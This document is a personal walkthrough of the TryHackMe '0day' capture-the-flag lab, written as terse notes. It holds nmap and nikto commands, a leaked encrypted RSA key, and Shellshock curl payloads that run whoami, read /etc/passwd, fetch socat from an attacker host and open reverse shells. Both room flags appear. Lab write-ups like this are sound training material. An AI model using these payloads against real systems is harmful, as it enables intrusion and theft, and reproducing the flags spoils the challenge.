## 08082023Tue

[TryHackMe | 0day](https://tryhackme.com/room/0day)

```
Exploit Ubuntu, like a Turtle in a Hurricane
```

![[Pasted image 20230808114325.png]]

![[Pasted image 20230808114627.png]]

[0day -- Writeup | MuirlandOracle | Blog](https://muirlandoracle.co.uk/2020/09/03/0day-writeup/)

```
nmap -p- -vv 10.10.238.56 -oG initial-scan
```

![[Pasted image 20230808115246.png]]
![[Pasted image 20230808115323.png]]

```
nmap -p 22,80 -vv -sV -sC 10.10.238.56 -oN common-scan
```

![[Pasted image 20230808125809.png]]

```
nikto --url 10.10.238.56 | tee nikto-results
```
![[Pasted image 20230808140801.png]]
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278

view-source:http://0day.thm/secret/
```
<html>
<head>
<title>Turtles?</title>
</head>
<body>
<center><img src="turtle.png"></center>
</body>
</html>
```
![[Pasted image 20230808130809.png]]

view-source:http://0day.thm/backup/
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

![[Pasted image 20230808131034.png]]


```
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://10.10.238.56/cgi-bin/test.cgi
```
![[Pasted image 20230808131900.png]]
![[Pasted image 20230808132054.png]]
![[Pasted image 20230808132234.png]]

```
python3 -m http.server 80
```

```
sudo socat tcp-l:53 file:`tty`,raw,echo=0
```

```
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/wget 10.17.44.152/socat -q -O /tmp/socat; /bin/chmod +x /tmp/socat" http://10.10.238.56/cgi-bin/test.cgi
```
![[Pasted image 20230808132610.png]]
![[Pasted image 20230808132638.png]]

```
curl -A "() { :;}; echo Content-Type: text/html; echo; /tmp/socat tcp:10.17.44.152:53 exec:'bash -li',pty,stderr,sigint,setsid,sane" http://10.10.238.56/cgi-bin/test.cgi
```


```
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://10.10.124.16/cgi-bin/test.cgi
```

```
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/wget 10.17.44.152/socat -q -O /tmp/socat; /bin/chmod +x /tmp/socat" http://10.10.124.16/cgi-bin/test.cgi
```

```
curl -A "() { :;}; echo Content-Type: text/html; echo; /tmp/socat tcp:10.17.44.152:53 exec:'bash -li',pty,stderr,sigint,setsid,sane" http://10.10.124.16/cgi-bin/test.cgi
```

![[Pasted image 20230808161225.png]]

```
THM{Sh3llSh0ck_r0ckz}
```

![[Pasted image 20230808161913.png]]

![[Pasted image 20230808162110.png]]

```
curl -A "() { :;}; echo Content-Type: text/html; echo;/bin/cat /etc/passwd;" http://10.10.124.16/cgi-bin/test.cgi
```
![[Pasted image 20230808162601.png]]


https://medium.com/@maftei.alexandru2017/0day-thm-write-up-36294e39635f

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.17.44.152/1337 0>&1'
```

```
nc -lvp 1337
```

```
curl -A "() { :;}; echo Content-Type: text/html; echo;/bin/bash -c '/bin/bash -i >& /dev/tcp/10.17.44.152/1337 0>&1';" http://10.10.124.16/cgi-bin/test.cgi
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
stty raw -echo
```

```
fg
```

```
export TERM=xterm
```

![[Pasted image 20230808164203.png]]
![[Pasted image 20230808164223.png]]

https://github.com/0x00nullSec/writeups/blob/master/0Day/0day.md

https://www.exploit-db.com/exploits/37292


![[Pasted image 20230808170337.png]]
![[Pasted image 20230808170624.png]]

```
THM{g00d_j0b_0day_is_Pleased}
```

![[Pasted image 20230808172143.png]]

![[Pasted image 20230808172326.png]]

